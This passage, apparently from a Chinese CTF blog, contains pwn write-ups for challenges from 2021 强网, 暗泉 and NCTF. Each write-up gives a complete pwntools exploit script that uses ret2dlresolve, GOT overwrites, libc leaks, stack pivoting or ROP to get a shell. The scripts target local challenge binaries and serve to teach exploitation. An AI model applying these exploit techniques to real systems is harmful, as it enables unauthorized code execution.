<p>因为文件描述符fd跟dest相邻，且dest刚好只有 0x20 个字节，我们这里可以在第二次输入中发送 0x20 个字节给src，这样strcpy函数进行拷贝时就会将fd覆盖成’\x00’，实现控制第三次输入的内容，从而进入到sub_8049269()函数。（要注意第一次输入时buf[]的第一个字节必须是’\x00’，否则strcpy函数在复制src[]字符串时会将buf[]中的字符串也复制进去，导致fd被覆盖成其他值）</p>
<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/sub_8049269.jpg" class>

<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/sub_8049236.jpg" class>

<p>这个函数很简单，两次输入后如果触发了if中的算术异常，则给一个栈溢出，因为要进入if中，所以v1肯定不是0，所以选择触发整数上溢异常，用 INT_MIN/-1 即可，也就是 (-2147483648)/(-1)</p>
<p>进入栈溢出函数后利用ret2dlresolve即可，这里学习一下用pwntools生成ret2dlresolve的payload</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;hello_boy&quot;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-2147483648&quot;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol = <span class="string">&#x27;system&#x27;</span>,args = [<span class="string">&#x27;/bin/sh&#x27;</span>])</span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">info(rop.dump())</span><br><span class="line"></span><br><span class="line">p.sendline(flat(&#123;<span class="number">0x4c</span>:rop.chain(),<span class="number">0x100</span>:dlresolve.payload&#125;))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/" class="post-title-link" itemprop="url">2021暗泉-reallNeedGoodLuck</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-02-27 14:10:02 / 修改时间：16:18:39" itemprop="dateCreated datePublished" datetime="2022-02-27T14:10:02+08:00">2022-02-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>程序保护如下</p>
<img src="/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/checksec.jpg" class>

<p>程序主逻辑如下</p>
<img src="/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/main.png" class>

<img src="/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/init.jpg" class>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序很简单，main函数种给了一次四个字节的任意地址写，并且用exit()函数来结束程序。</p>
<p>① 显然一次任意地址写是远不够的，所以首先需要考虑怎么重复利用，而由于got表是可写的，所以只需要将exit()函数的got表改成main函数的地址即可。</p>
<p>② 如果我们能将atoi()函数的got表也改成system()函数的话，那么我们就可以直接执行system(‘/bin/sh’)，因为atoi()函数的参数是我们可控的。那么此时有两种思路：第一种是泄漏libc，第二种是直接爆破system()地址。</p>
<h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>（题目环境是Ubuntu GLIBC 2.23-0ubuntu11.3）</p>
<p>由于ASLR对libc低12位对齐的关系，我们可以直接将atoi()函数的got表最低12位改成system()的偏移，剩下的字节选择爆破</p>
<img src="/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/blast-1.jpg" class>

<p>可以看到除了最低12位以外这两个函数的got表地址只差一个字节，所以我们直接修改atoi()函数的最低两个字节（最低12位改成system的偏移，剩下4位随便改(实际发现改成f成功率会高很多)），然后直接爆破即可，因为爆破长度只有一个字节，所以成功率还是比较高的。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;reallNeedGoodLuck&quot;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4011A9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">content,addr</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;good&quot;</span>,content)</span><br><span class="line">    p.sendafter(<span class="string">&quot;luck! &quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    write(p32(main),<span class="number">0x404038</span>)</span><br><span class="line">    write(<span class="string">&#x27;\x00\x00\xa0\xf3&#x27;</span>,elf.got[<span class="string">&#x27;atoi&#x27;</span>]-<span class="number">2</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;good&quot;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;luck! &quot;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./reallNeedGoodLuck&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h4 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h4><p>因为这题的栈是不可控的，所以要泄漏libc的话只能在代码段中寻找有无合适的函数，利用修改这个函数的got表为输出函数来完成泄漏，那么就需要这个函数的参数是可控的，亦或者其本身就是合适的。我们仔细观察可以发现在init()函数中的第二个setvbuf()函数就是这样一个合适的函数，因为其第一个参数是<code>_bss_start</code>，是我们可以利用任意地址写去修改的，所以我们就可以修改setvbuf()函数的got表为puts()函数，然后修改<code>_bss_start</code>为某个函数的got表地址即可完成泄漏。</p>
<img src="/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/bss-start.jpg" class>

<p>可以看到<code>_bss_start</code>位于<code>0x404050</code>处。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./reallNeedGoodLuck&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/giantbranch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./reallNeedGoodLuck&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,content</span>):</span></span><br><span class="line">	p.sendafter(<span class="string">&quot;good\n&quot;</span>,p32(content))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;luck! \n&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x404038</span>,<span class="number">0x4011CA</span>)</span><br><span class="line">write(<span class="number">0x404028</span>,elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">write(<span class="number">0x404028</span>+<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">write(<span class="number">0x404050</span>,elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>])</span><br><span class="line">write(<span class="number">0x404050</span>+<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">write(<span class="number">0x404038</span>,<span class="number">0x4011A9</span>)</span><br><span class="line">pause()</span><br><span class="line">p.recv(<span class="number">5</span>)</span><br><span class="line">libcbase_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libcbase_addr = libcbase_addr - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libcbase_addr = &quot;</span>,<span class="built_in">hex</span>(libcbase_addr)</span><br><span class="line">sys = libcbase_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x404038</span>,<span class="number">0x4011CA</span>)</span><br><span class="line">write(<span class="number">0x0404030</span>,(sys)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;good\n&quot;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;luck! \n&quot;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>要注意的是因为main函数中的任意地址写只写四个字节，所以要保证八个字节对齐的地址中剩下的四个字节为0。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/" class="post-title-link" itemprop="url">2021暗泉-justdoit</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-02-23 23:38:37" itemprop="dateCreated datePublished" datetime="2022-02-23T23:38:37+08:00">2022-02-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-24 00:25:18" itemprop="dateModified" datetime="2022-02-24T00:25:18+08:00">2022-02-24</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>首先看看题目，main函数如下</p>
<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/main.png" class>

<p>read_long() 函数如下</p>
<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/read_long.jpg" class>

<p>题目给的两处输入都没有溢出，但仔细观察main函数的汇编会发现有这个</p>
<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-1.jpg" class>

<p>因为read_long()函数中用到了 atol() 函数将我们的输入的字符串转化为整型，且这个函数的返回值就是转化后的整型值，显然 read_long() 函数加上红线汇编就起到让我们任意控制 rbp 的值，间接让我们控制了返回地址。同时因为main函数中的局部变量 buf[32] 并没有被初始化，我们就可以利用第一个输入在栈上布置返回地址，但是其只允许我们输入 0x18 个字节，也就是最多一次布置3条返回地址，但是因为我们首先需要泄漏libc，所以我们需要多次返回main函数完成ROP的布置以及泄漏，需要布置如下ROP：</p>
<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-2.jpg" class>

<p>那么我们第一次如下输入</p>
<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-3.jpg" class>

<p>然后将 rbp 拉到 rsp 的位置</p>
<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-4.png" class>

<p>leave_ret之后</p>
<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-5.png" class>

<p>再次执行到main函数的第一个read时的栈</p>
<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-6.png" class>

<p>由此完成泄漏ROP的布置</p>
<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-7.jpg" class>

<p>其实这部分很简单，简单分析下函数调用就完了，再往后getshell部分重复即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./justdoit&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./justdoit&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4011D5</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x04012b3</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x4011D5&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(main)*<span class="number">3</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">40</span>))</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">sys = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(main)*<span class="number">3</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(pop_rdi) + p64(binsh) + p64(sys))</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">40</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/22/ret2-libcsyscall/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/22/ret2-libcsyscall/" class="post-title-link" itemprop="url">ret2_libcsyscall</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-02-22 02:25:04 / 修改时间：03:03:16" itemprop="dateCreated datePublished" datetime="2022-02-22T02:25:04+08:00">2022-02-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>以 2.27 的 libc 版本为例，在如下函数的某处偏移中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;read + 15&gt;		syscall</span><br><span class="line">&lt;write + 18&gt;	syscall</span><br><span class="line">&lt;open64 + 76&gt;	syscall</span><br><span class="line">&lt;alarm + 5&gt;		syscall</span><br><span class="line">&lt;close + 18&gt;	syscall</span><br></pre></td></tr></table></figure>

<p>这些函数的这些位置调用的就是<code>syscall</code>这个指令，如果能将某些函数的got修改为这些函数的这些位置就得到了syscall指令，而且由于 ASLR 对 libc 的随机化不会影响其最低12位（即最低3位16进制数），所以有时候当某个函数的 got 表跟其函数内部的 syscall 指令地址只有一个字节相差的时候，我们可以直接修改掉最低一字节即可，连爆破都不用。（好像都是只差一个字节）</p>
<p>这个方法可以用在当我们需要构造 syscall 而程序中没有现存的 syscall 指令的时候。</p>
<h3 id="2021NCTF-login"><a href="#2021NCTF-login" class="headerlink" title="2021NCTF-login"></a>2021NCTF-login</h3><p>例行保护</p>
<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-checksec.jpg" class>

<p>程序主逻辑如下</p>
<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-main.png" class>

<p>程序很简单，只有一个 0x10 字节长度的溢出，所以当然想到栈迁移到 .bss 段继续我们的构造。同时因为关闭了标准输出和标准错误输出，所以无法泄漏内存。</p>
<p>那么我们自然会想到，如果无法泄漏内存的话只能我们手动makecall，那么一定会需要 syscall 指令，可惜程序中没有现存的 syscall 指令，那么我们尝试在已经调用了的函数中寻找。</p>
<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-libcsyscall.jpg" class>

<p>可以看到在 close 函数的 +21 处就是一条 syscall 指令，而且 close 函数在 main 函数中已经调用过，所以我们可以利用 read 函数直接修改其 got 表最低一字节，由此得到一条 syscall 指令。</p>
<p>由此我们确定思路：将栈迁移到 .bss 段，同时在上面写好我们的ROP，①需要在已知地址写入’/bin/sh‘作参数。②需要修改 close 函数的 got 表得到 syscall 指令。③ makecall调用execve。</p>
<p>细节慢慢调即可，exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line"></span><br><span class="line">csu_addr = <span class="number">0x40128A</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">call_addr,rdi,rsi,rdx</span>):</span></span><br><span class="line">	payload = p64(<span class="number">0</span>)  <span class="comment">#rbx</span></span><br><span class="line">	payload += p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">	payload += p64(rdi) <span class="comment">#r12</span></span><br><span class="line">	payload += p64(rsi) <span class="comment">#r13</span></span><br><span class="line">	payload += p64(rdx) <span class="comment">#r14</span></span><br><span class="line">	payload += p64(call_addr) <span class="comment">#r15</span></span><br><span class="line">	payload += p64(<span class="number">0x401270</span>) <span class="comment">#ret</span></span><br><span class="line">	payload += p64(<span class="number">1</span>) <span class="comment">#padding</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line">read = <span class="number">0x4011ED</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(bss + <span class="number">0x300</span>) + p64(read)</span><br><span class="line">p.sendafter(<span class="string">&quot;Welcome to NCTF2021!&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#write to bss+0x200</span></span><br><span class="line">payload = p64(<span class="number">0x40128A</span>) + csu(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,elf.got[<span class="string">&#x27;close&#x27;</span>],<span class="number">1</span>)</span><br><span class="line">payload += csu(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,bss+<span class="number">0x400</span>,<span class="number">59</span>)</span><br><span class="line">payload += csu(elf.got[<span class="string">&#x27;close&#x27;</span>],bss+<span class="number">0x400</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss+<span class="number">0x1f8</span>) + p64(<span class="number">0x40121F</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">&quot;\x85&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">59</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/13/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C-%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6angr/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/13/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C-%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6angr/" class="post-title-link" itemprop="url">符号执行-基于python的二进制分析框架angr</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-02-13 20:14:30" itemprop="dateCreated datePublished" datetime="2022-02-13T20:14:30+08:00">2022-02-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-16 22:48:57" itemprop="dateModified" datetime="2022-02-16T22:48:57+08:00">2022-02-16</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h4><p>[一篇比较好的文章](<a href="https://github.com/chyyuu/symexe/blob/master/klee_document/klee_analysis.md">symexe/klee_analysis.md at master · chyyuu/symexe · GitHub</a>)</p>
<p>如果仅学习如何使用angr框架的话其实不需要对符号执行有过多了解，所以这里只做简单概述，更详细的地方可以看上面的文章。</p>
<blockquote>
